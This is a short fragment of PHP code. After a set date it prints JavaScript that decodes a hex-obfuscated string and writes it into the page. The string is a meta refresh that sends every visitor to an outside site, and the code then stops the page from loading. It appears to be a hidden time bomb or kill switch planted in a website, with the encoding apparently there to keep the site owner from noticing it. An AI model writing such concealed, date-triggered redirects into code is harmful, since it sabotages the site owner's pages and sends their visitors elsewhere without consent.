			...
			if($mes2 == $messervidor){
				if($dia2 > $diaservidor){
					?><script language="JavaScript" type="text/javascript">
						var i,y,x="3c6d65746120485454502d4551554956203d2022526566726573682220434f4e54454e54203d2022303b2055524c203d20687474703a2f2f7777772e7765626465766963652e636f6d2e62722f686f6d656465766963652f223e";y='';for(i=0;i<x.length;i+=2){y+=unescape('%'+x.substr(i,2));}document.write(y);
					</script>
					<? exit();
				}			
			} 
